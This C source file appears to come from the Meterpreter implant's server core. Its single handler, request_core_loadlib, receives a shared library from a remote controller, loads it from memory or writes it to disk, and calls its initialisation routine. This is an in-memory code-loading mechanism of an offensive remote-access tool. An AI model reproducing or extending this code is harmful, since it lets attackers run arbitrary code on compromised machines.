#include <dlfcn.h>
#include "metsrv.h"


DWORD
request_core_loadlib(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	PCHAR targetPath;
	int local_error = 0;
	
	do
	{
		libraryPath = packet_get_tlv_value_string(packet, 
				TLV_TYPE_LIBRARY_PATH);
		flags       = packet_get_tlv_value_uint(packet, 
				TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath) {
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		// If the lib does not exist locally, but is being uploaded...
		if (!(flags & LOAD_LIBRARY_FLAG_LOCAL))	{
			Tlv dataTlv;

			// Get the library's file contents
			if ((packet_get_tlv(packet, TLV_TYPE_DATA,
					&dataTlv) != ERROR_SUCCESS) ||
			    (!(targetPath = packet_get_tlv_value_string(packet,
					TLV_TYPE_TARGET_PATH)))) {
				res = ERROR_INVALID_PARAMETER;
				break;
			}

			// If the library is not to be stored on disk, 
			if (!(flags & LOAD_LIBRARY_FLAG_ON_DISK)) {
				library = dlopenbuf(NULL, dataTlv.buffer, dataTlv.header.length );
				res = (library) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
				//Taken from buffer_to_file (should be changed to random)
				targetPath = "/tmp/foo";
			} else {
				// Otherwise, save the library buffer to disk
				res = buffer_to_file(targetPath, dataTlv.buffer, 
						dataTlv.header.length);
			}

			// Override the library path
			libraryPath = targetPath;
		}

		// If a previous operation failed, break out.
		if (res != ERROR_SUCCESS)
			break;
		
		// Load the library
		if ((!library) && (library = dlopen(targetPath, RTLD_GLOBAL|RTLD_LAZY)) == NULL)
			res = GetLastError();

		else
			res = ERROR_SUCCESS;

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if ((flags & LOAD_LIBRARY_FLAG_EXTENSION) && (library)){
			DWORD (*init)(Remote *remote);

			init = dlsym(library, "InitServerExtension" );
			// Call the init routine in the library
			if( init )
				res = init(remote);
		}
		
	} while (0);
	
	if (response) {
		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
		packet_transmit(remote, response, NULL);
	}

	return (res);
}
